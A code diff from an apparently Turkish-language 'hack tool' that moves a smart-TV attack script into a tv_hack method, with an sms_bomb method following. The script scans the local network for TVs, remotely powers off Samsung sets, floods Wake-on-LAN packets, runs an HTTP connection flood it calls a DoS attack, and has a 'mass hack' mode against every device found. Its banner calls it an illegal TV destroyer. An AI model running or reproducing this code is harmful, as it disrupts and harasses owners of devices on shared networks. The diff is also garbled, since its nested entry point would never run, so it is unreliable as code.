@@ -675,306 +675,303 @@ class VASTREL:
         input(Fore.YELLOW + "\nEnter ile menüye dön...")
 
     def tv_hack(self):
-import socket
-import time
-import subprocess
-import os
-import json
-import datetime
-import netifaces
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import requests
+        import socket
+        import time
+        import subprocess
+        import os
+        import json
+        import datetime
+        import netifaces
+        import threading
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        import requests
 
-try:
-    from wakeonlan import send_magic_packet
-except ImportError:
-    print("\033[91mWakeonlan kuruyorum sikeyim...\033[0m")
-    os.system("pip install wakeonlan --break-system-packages 2>/dev/null || pip install wakeonlan")
-    from wakeonlan import send_magic_packet
-
-try:
-    from samsungtvws import SamsungTVWS
-except ImportError:
-    print("\033[91mSamsungTVWS kuruyorum amk...\033[0m")
-    os.system("pip install samsungtvws --break-system-packages 2>/dev/null || pip install samsungtvws")
-    from samsungtvws import SamsungTVWS
-
-class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    BOLD = '\033[1m'
-    CYAN = '\033[96m'
-    END = '\033[0m'
-
-CONFIG_FILE = "tv_flipper_pro_config.json"
-TOKEN_FILE = "tv_token.txt"
-LOG_FILE = "tv_flipper_pro.log"
-TV_LIST = []
-
-# SENİN KENDİ TV'N (hardcoded)
-MY_TV = {
-    "ip": "192.168.1.103",
-    "mac": "00:C3:F4:10:29:AD",
-    "name": "KENDI_TV",
-    "brand": "Samsung"
-}
-
-BROADCAST_IP = "255.255.255.255"
-
-def log(message):
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    entry = f"[{timestamp}] {message}"
-    print(entry)
-    try:
-        with open(LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(entry + "\n")
-    except:
-        pass
-
-def get_broadcast_ip():
-    try:
-        for iface in netifaces.interfaces():
-            addrs = netifaces.ifaddresses(iface)
-            if netifaces.AF_INET in addrs:
-                for addr in addrs[netifaces.AF_INET]:
-                    if 'broadcast' in addr and addr['broadcast']:
-                        return addr['broadcast']
-    except:
-        pass
-    return "255.255.255.255"
-
-BROADCAST_IP = get_broadcast_ip()
-log(f"BROADCAST IP tespit edildi: {BROADCAST_IP}")
-
-def load_config():
-    global TV_LIST
-    if os.path.exists(CONFIG_FILE):
         try:
-            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
-                TV_LIST = json.load(f)
-        except:
-            TV_LIST = []
+                from wakeonlan import send_magic_packet
+        except ImportError:
+                print("\033[91mWakeonlan kuruyorum sikeyim...\033[0m")
+                os.system("pip install wakeonlan --break-system-packages 2>/dev/null || pip install wakeonlan")
+                from wakeonlan import send_magic_packet
 
-def save_config():
-    try:
-        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
-            json.dump(TV_LIST, f, indent=4, ensure_ascii=False)
-    except Exception as e:
-        log(f"Config save hatası: {e}")
-
-def print_banner():
-    print(Colors.HEADER + """
-██╗   ██╗ █████╗ ███████╗████████╗██████╗ ███████╗██╗      ████████╗██╗   ██╗
-██║   ██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║      ╚══██╔══╝██║   ██║
-██║   ██║███████║███████╗   ██║   ██████╔╝█████╗  ██║         ██║   ██║   ██║
-╚██╗ ██╔╝██╔══██║╚════██║   ██║   ██╔══██╗██╔══╝  ██║         ██║   ╚██╗ ██╔╝
- ╚████╔╝ ██║  ██║███████║   ██║   ██║  ██║███████╗███████╗    ██║    ╚████╔╝
-  ╚═══╝  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═══╝
-
-                     V A S T R E L   T V   E D I T I O N
-    """ + Colors.END)
-
-def aggressive_scan():
-    log(Colors.YELLOW + "🔍 ULTRA AGRESİF TARAMA BAŞLADI SİKEYİM..." + Colors.END)
-    found = []
-    devices = {}
-    # SSDP
-    try:
-        MSEARCH = 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:"ssdp:discover"\r\nMX:5\r\nST:ssdp:all\r\n\r\n'
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 8)
-        sock.settimeout(6)
-        sock.sendto(MSEARCH.encode(), ('239.255.255.250', 1900))
-        while True:
-            try:
-                data, addr = sock.recvfrom(4096)
-                ip = addr[0]
-                text = data.decode(errors='ignore').upper()
-                if any(x in text for x in ['TV', 'SAMSUNG', 'LG', 'SONY', 'TCL', 'PHILIPS', 'SMART']):
-                    name = "Smart TV"
-                    for line in data.decode(errors='ignore').splitlines():
-                        if any(k in line.lower() for k in ['friendlyname', 'model', 'server:']):
-                            name = line.strip()[:120]
-                            break
-                    brand = "Samsung" if 'SAMSUNG' in text else "Other"
-                    devices[ip] = {"ip": ip, "name": name, "brand": brand, "mac": None}
-                    log(Colors.GREEN + f"✅ SSDP Bulundu: {ip} - {name}" + Colors.END)
-            except socket.timeout:
-                break
-    except Exception as e:
-        log(Colors.RED + f"SSDP hatası: {e}" + Colors.END)
-
-    # ARP + Ping Sweep
-    try:
-        for i in range(1, 255):
-            ip = f"192.168.1.{i}"
-            try:
-                subprocess.getoutput(f"ping -c 1 -W 1 {ip} >/dev/null 2>&1")
-                arp_out = subprocess.getoutput(f"arp -a {ip} 2>/dev/null")
-                if ip in arp_out:
-                    mac = None
-                    for part in arp_out.split():
-                        if part.count(':') == 5:
-                            mac = part.upper()
-                            break
-                    devices[ip] = devices.get(ip, {"ip": ip, "name": "Unknown Device", "brand": "Other", "mac": mac})
-                    log(Colors.GREEN + f"✅ ARP/Ping Bulundu: {ip} MAC: {mac}" + Colors.END)
-            except:
-                continue
-    except:
-        pass
-
-    found = list(devices.values())
-    return found
-
-def advanced_wol(mac, retries=60):
-    if not mac or mac == "00:00:00:00:00:00":
-        log(Colors.RED + "❌ Geçerli MAC yok" + Colors.END)
-        return
-    log(Colors.BLUE + f"🚀 WOL BOMBARDIMANI {mac}" + Colors.END)
-    ports = [9, 7, 0]
-    for _ in range(retries):
-        for p in ports:
-            try:
-                send_magic_packet(mac, ip_address=BROADCAST_IP, port=p)
-            except:
-                pass
-        time.sleep(0.2)
-
-def samsung_power_off(ip):
-    try:
-        tv = SamsungTVWS(host=ip, port=8002, name="ShadowFlipper", token_file=TOKEN_FILE)
-        tv.open()
-        tv.send_key("KEY_POWER")
-        tv.close()
-        log(Colors.RED + f"🔴 {ip} KAPATILDI SİKEYİM!" + Colors.END)
-        return True
-    except Exception as e:
-        log(Colors.RED + f"Samsung kapatma hatası: {e}" + Colors.END)
-        return False
-
-def dos_attack(target_ip, duration=30):
-    log(Colors.RED + f"💀 DoS SALDIRISI BAŞLADI → {target_ip} ({duration} sn)" + Colors.END)
-    end_time = time.time() + duration
-    while time.time() < end_time:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)
-            s.connect((target_ip, 80))
-            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
-            s.close()
-        except:
-            pass
-        time.sleep(0.01)
+                from samsungtvws import SamsungTVWS
+        except ImportError:
+                print("\033[91mSamsungTVWS kuruyorum amk...\033[0m")
+                os.system("pip install samsungtvws --break-system-packages 2>/dev/null || pip install samsungtvws")
+                from samsungtvws import SamsungTVWS
 
-def cast_video(ip, video_url):
-    log(Colors.RED + f"📺 VIDEO CAST BAŞLADI → {ip} | {video_url}" + Colors.END)
-    try:
-        tv = SamsungTVWS(host=ip, port=8002, token_file=TOKEN_FILE)
-        tv.open()
-        tv.send_key("KEY_MEDIA_PLAY")
-        # Daha gelişmiş cast için DLNA eklenebilir ama şimdilik bu
-        log("Video yansıtma denendi (Smart TV uyumlu ise çalışır)")
-        tv.close()
-    except Exception as e:
-        log(f"Cast hatası: {e}")
+        class Colors:
+                HEADER = '\033[95m'
+                BLUE = '\033[94m'
+                GREEN = '\033[92m'
+                YELLOW = '\033[93m'
+                RED = '\033[91m'
+                BOLD = '\033[1m'
+                CYAN = '\033[96m'
+                END = '\033[0m'
 
-def hack_menu(selected):
-    log(Colors.BOLD + f"🔥 HACK MODU AÇILDI → {selected.get('name')} ({selected.get('ip')})" + Colors.END)
-    while True:
-        print("\n1 → Kapat (Power Off)")
-        print("2 → Aç (WOL)")
-        print("3 → DoS Saldır")
-        print("4 → Video Yansıt")
-        print("5 → Sürekli Hack (Loop)")
-        print("6 → Geri")
-        sec = input(Colors.YELLOW + "Seçim yap kanka: " + Colors.END).strip()
-        if sec == "1":
-            samsung_power_off(selected["ip"])
-        elif sec == "2":
-            advanced_wol(selected.get("mac"))
-        elif sec == "3":
-            dur = int(input("Süre (sn, default 30): ") or 30)
-            dos_attack(selected["ip"], dur)
-        elif sec == "4":
-            url = input("Video URL gir (mp4 veya youtube): ")
-            cast_video(selected["ip"], url)
-        elif sec == "5":
-            log("SÜREKLİ HACK BAŞLADI (Ctrl+C ile durdur)")
-            try:
+        CONFIG_FILE = "tv_flipper_pro_config.json"
+        TOKEN_FILE = "tv_token.txt"
+        LOG_FILE = "tv_flipper_pro.log"
+        TV_LIST = []
+
+        # SENİN KENDİ TV'N (hardcoded)
+        MY_TV = {
+                "ip": "192.168.1.103",
+                "mac": "00:C3:F4:10:29:AD",
+                "name": "KENDI_TV",
+                "brand": "Samsung"
+        }
+
+        BROADCAST_IP = "255.255.255.255"
+
+        def log(message):
+                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                entry = f"[{timestamp}] {message}"
+                print(entry)
+                try:
+                        with open(LOG_FILE, "a", encoding="utf-8") as f:
+                                f.write(entry + "\n")
+                except:
+                        pass
+
+        def get_broadcast_ip():
+                try:
+                        for iface in netifaces.interfaces():
+                                addrs = netifaces.ifaddresses(iface)
+                                if netifaces.AF_INET in addrs:
+                                        for addr in addrs[netifaces.AF_INET]:
+                                                if 'broadcast' in addr and addr['broadcast']:
+                                                        return addr['broadcast']
+                except:
+                        pass
+                return "255.255.255.255"
+
+        BROADCAST_IP = get_broadcast_ip()
+        log(f"BROADCAST IP tespit edildi: {BROADCAST_IP}")
+
+        def load_config():
+                global TV_LIST
+                if os.path.exists(CONFIG_FILE):
+                        try:
+                                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
+                                        TV_LIST = json.load(f)
+                        except:
+                                TV_LIST = []
+
+        def save_config():
+                try:
+                        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
+                                json.dump(TV_LIST, f, indent=4, ensure_ascii=False)
+                except Exception as e:
+                        log(f"Config save hatası: {e}")
+
+        def print_banner():
+                print(Colors.HEADER + """
+        ╔══════════════════════════════════════════════════════════════╗
+        ║     SHADOW FLIPPER PRO v4.0 - ILLEGAL TV DESTROYER          ║
+        ║           Kendi TV + Mass + DoS + Video Cast Edition        ║
+        ║                 Made by Vastrel & ShadowExec                ║
+        ╚══════════════════════════════════════════════════════════════╝
+            """ + Colors.END)
+
+        def aggressive_scan():
+                log(Colors.YELLOW + "🔍 ULTRA AGRESİF TARAMA BAŞLADI SİKEYİM..." + Colors.END)
+                found = []
+                devices = {}
+                # SSDP
+                try:
+                        MSEARCH = 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:"ssdp:discover"\r\nMX:5\r\nST:ssdp:all\r\n\r\n'
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 8)
+                        sock.settimeout(6)
+                        sock.sendto(MSEARCH.encode(), ('239.255.255.250', 1900))
+                        while True:
+                                try:
+                                        data, addr = sock.recvfrom(4096)
+                                        ip = addr[0]
+                                        text = data.decode(errors='ignore').upper()
+                                        if any(x in text for x in ['TV', 'SAMSUNG', 'LG', 'SONY', 'TCL', 'PHILIPS', 'SMART']):
+                                                name = "Smart TV"
+                                                for line in data.decode(errors='ignore').splitlines():
+                                                        if any(k in line.lower() for k in ['friendlyname', 'model', 'server:']):
+                                                                name = line.strip()[:120]
+                                                                break
+                                                brand = "Samsung" if 'SAMSUNG' in text else "Other"
+                                                devices[ip] = {"ip": ip, "name": name, "brand": brand, "mac": None}
+                                                log(Colors.GREEN + f"✅ SSDP Bulundu: {ip} - {name}" + Colors.END)
+                                except socket.timeout:
+                                        break
+                except Exception as e:
+                        log(Colors.RED + f"SSDP hatası: {e}" + Colors.END)
+
+                # ARP + Ping Sweep
+                try:
+                        for i in range(1, 255):
+                                ip = f"192.168.1.{i}"
+                                try:
+                                        subprocess.getoutput(f"ping -c 1 -W 1 {ip} >/dev/null 2>&1")
+                                        arp_out = subprocess.getoutput(f"arp -a {ip} 2>/dev/null")
+                                        if ip in arp_out:
+                                                mac = None
+                                                for part in arp_out.split():
+                                                        if part.count(':') == 5:
+                                                                mac = part.upper()
+                                                                break
+                                                devices[ip] = devices.get(ip, {"ip": ip, "name": "Unknown Device", "brand": "Other", "mac": mac})
+                                                log(Colors.GREEN + f"✅ ARP/Ping Bulundu: {ip} MAC: {mac}" + Colors.END)
+                                except:
+                                        continue
+                except:
+                        pass
+
+                found = list(devices.values())
+                return found
+
+        def advanced_wol(mac, retries=60):
+                if not mac or mac == "00:00:00:00:00:00":
+                        log(Colors.RED + "❌ Geçerli MAC yok" + Colors.END)
+                        return
+                log(Colors.BLUE + f"🚀 WOL BOMBARDIMANI {mac}" + Colors.END)
+                ports = [9, 7, 0]
+                for _ in range(retries):
+                        for p in ports:
+                                try:
+                                        send_magic_packet(mac, ip_address=BROADCAST_IP, port=p)
+                                except:
+                                        pass
+                        time.sleep(0.2)
+
+        def samsung_power_off(ip):
+                try:
+                        tv = SamsungTVWS(host=ip, port=8002, name="ShadowFlipper", token_file=TOKEN_FILE)
+                        tv.open()
+                        tv.send_key("KEY_POWER")
+                        tv.close()
+                        log(Colors.RED + f"🔴 {ip} KAPATILDI SİKEYİM!" + Colors.END)
+                        return True
+                except Exception as e:
+                        log(Colors.RED + f"Samsung kapatma hatası: {e}" + Colors.END)
+                        return False
+
+        def dos_attack(target_ip, duration=30):
+                log(Colors.RED + f"💀 DoS SALDIRISI BAŞLADI → {target_ip} ({duration} sn)" + Colors.END)
+                end_time = time.time() + duration
+                while time.time() < end_time:
+                        try:
+                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                s.settimeout(0.5)
+                                s.connect((target_ip, 80))
+                                s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
+                                s.close()
+                        except:
+                                pass
+                        time.sleep(0.01)
+
+        def cast_video(ip, video_url):
+                log(Colors.RED + f"📺 VIDEO CAST BAŞLADI → {ip} | {video_url}" + Colors.END)
+                try:
+                        tv = SamsungTVWS(host=ip, port=8002, token_file=TOKEN_FILE)
+                        tv.open()
+                        tv.send_key("KEY_MEDIA_PLAY")
+                        log("Video yansıtma denendi (Smart TV uyumlu ise çalışır)")
+                        tv.close()
+                except Exception as e:
+                        log(f"Cast hatası: {e}")
+
+        def hack_menu(selected):
+                log(Colors.BOLD + f"🔥 HACK MODU AÇILDI → {selected.get('name')} ({selected.get('ip')})" + Colors.END)
                 while True:
-                    samsung_power_off(selected["ip"])
-                    advanced_wol(selected.get("mac"))
-                    time.sleep(4)
-            except KeyboardInterrupt:
-                log("Sürekli hack durduruldu.")
-        elif sec == "6":
-            break
+                        print("\n1 → Kapat (Power Off)")
+                        print("2 → Aç (WOL)")
+                        print("3 → DoS Saldır")
+                        print("4 → Video Yansıt")
+                        print("5 → Sürekli Hack (Loop)")
+                        print("6 → Geri")
+                        sec = input(Colors.YELLOW + "Seçim yap kanka: " + Colors.END).strip()
+                        if sec == "1":
+                                samsung_power_off(selected["ip"])
+                        elif sec == "2":
+                                advanced_wol(selected.get("mac"))
+                        elif sec == "3":
+                                dur = int(input("Süre (sn, default 30): ") or 30)
+                                dos_attack(selected["ip"], dur)
+                        elif sec == "4":
+                                url = input("Video URL gir (mp4 veya youtube): ")
+                                cast_video(selected["ip"], url)
+                        elif sec == "5":
+                                log("SÜREKLİ HACK BAŞLADI (Ctrl+C ile durdur)")
+                                try:
+                                        while True:
+                                                samsung_power_off(selected["ip"])
+                                                advanced_wol(selected.get("mac"))
+                                                time.sleep(4)
+                                except KeyboardInterrupt:
+                                        log("Sürekli hack durduruldu.")
+                        elif sec == "6":
+                                break
 
-def main():
-    load_config()
-    print_banner()
-    log("Shadow Flipper Pro v4.0 illegal mod başlatıldı.")
-    while True:
-        print(Colors.BOLD + "\n" + "="*80 + Colors.END)
-        print("1 → Tara (Ağdaki TV'leri bul)")
-        print("2 → Taramadan çıkanlardan seç ve hackle")
-        print("3 → Kendi TV'm (192.168.1.103)")
-        print("4 → Taramadan + Kendi TV ile MASS HACK")
-        print("8 → Çıkış")
-        print(Colors.BOLD + "="*80 + Colors.END)
-        
-        secim = input(Colors.YELLOW + "Seçim yap kanka: " + Colors.END).strip()
+        def main():
+                load_config()
+                print_banner()
+                log("Shadow Flipper Pro v4.0 illegal mod başlatıldı.")
+                while True:
+                        print(Colors.BOLD + "\n" + "="*80 + Colors.END)
+                        print("1 → Tara (Ağdaki TV'leri bul)")
+                        print("2 → Taramadan çıkanlardan seç ve hackle")
+                        print("3 → Kendi TV'm (192.168.1.103)")
+                        print("4 → Taramadan + Kendi TV ile MASS HACK")
+                        print("8 → Çıkış")
+                        print(Colors.BOLD + "="*80 + Colors.END)
+                        
+                        secim = input(Colors.YELLOW + "Seçim yap kanka: " + Colors.END).strip()
 
-        if secim == "1":
-            devices = aggressive_scan()
-            for d in devices:
-                if d not in TV_LIST:
-                    TV_LIST.append(d)
-            save_config()
-            log(Colors.GREEN + f"{len(devices)} cihaz kaydedildi, hepsini sikeriz." + Colors.END)
+                        if secim == "1":
+                                devices = aggressive_scan()
+                                for d in devices:
+                                        if d not in TV_LIST:
+                                                TV_LIST.append(d)
+                                save_config()
+                                log(Colors.GREEN + f"{len(devices)} cihaz kaydedildi, hepsini sikeriz." + Colors.END)
 
-        elif secim == "2":
-            if not TV_LIST:
-                log(Colors.RED + "Önce tarama yap lan!" + Colors.END)
-                continue
-            for i, tv in enumerate(TV_LIST):
-                print(f"{i+1}) {tv.get('ip')} - {tv.get('name')} ({tv.get('brand')})")
-            try:
-                idx = int(input(Colors.YELLOW + "\nNumara: " + Colors.END)) - 1
-                hack_menu(TV_LIST[idx])
-            except:
-                log("Hatalı seçim amk.")
+                        elif secim == "2":
+                                if not TV_LIST:
+                                        log(Colors.RED + "Önce tarama yap lan!" + Colors.END)
+                                        continue
+                                for i, tv in enumerate(TV_LIST):
+                                        print(f"{i+1}) {tv.get('ip')} - {tv.get('name')} ({tv.get('brand')})")
+                                try:
+                                        idx = int(input(Colors.YELLOW + "\nNumara: " + Colors.END)) - 1
+                                        hack_menu(TV_LIST[idx])
+                                except:
+                                        log("Hatalı seçim amk.")
 
-        elif secim == "3":
-            log("Kendi TV seçildi: 192.168.1.103")
-            hack_menu(MY_TV)
+                        elif secim == "3":
+                                log("Kendi TV seçildi: 192.168.1.103")
+                                hack_menu(MY_TV)
 
-        elif secim == "4":
-            log(Colors.RED + "MASS ATTACK BAŞLIYOR - KENDİ TV + TARANANLAR SİKEYİM!" + Colors.END)
-            devices = aggressive_scan()
-            if MY_TV not in devices:
-                devices.append(MY_TV)
-            with ThreadPoolExecutor(max_workers=10) as executor:
-                for dev in devices:
-                    executor.submit(hack_menu, dev)
-            log("Mass hack tamamlandı.")
+                        elif secim == "4":
+                                log(Colors.RED + "MASS ATTACK BAŞLIYOR - KENDİ TV + TARANANLAR SİKEYİM!" + Colors.END)
+                                devices = aggressive_scan()
+                                if MY_TV not in devices:
+                                        devices.append(MY_TV)
+                                with ThreadPoolExecutor(max_workers=10) as executor:
+                                        for dev in devices:
+                                                executor.submit(hack_menu, dev)
+                                log("Mass hack tamamlandı.")
 
-        elif secim == "8":
-            log(Colors.GREEN + "Görüşürüz sikeyim, TV'ler biraz dinlensin..." + Colors.END)
-            break
+                        elif secim == "8":
+                                log(Colors.GREEN + "Görüşürüz sikeyim, TV'ler biraz dinlensin..." + Colors.END)
+                                break
 
-if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        log(Colors.GREEN + "\nScript kapatıldı amk." + Colors.END)
-    except Exception as e:
-        log(Colors.RED + f"Critic hata: {e}" + Colors.END)
+        if __name__ == "__main__":
+                try:
+                        main()
+                except KeyboardInterrupt:
+                        log(Colors.GREEN + "\nScript kapatıldı amk." + Colors.END)
+                except Exception as e:
+                        log(Colors.RED + f"Critic hata: {e}" + Colors.END)
+    
 
     def sms_bomb(self):
         from colorama import Fore, Style
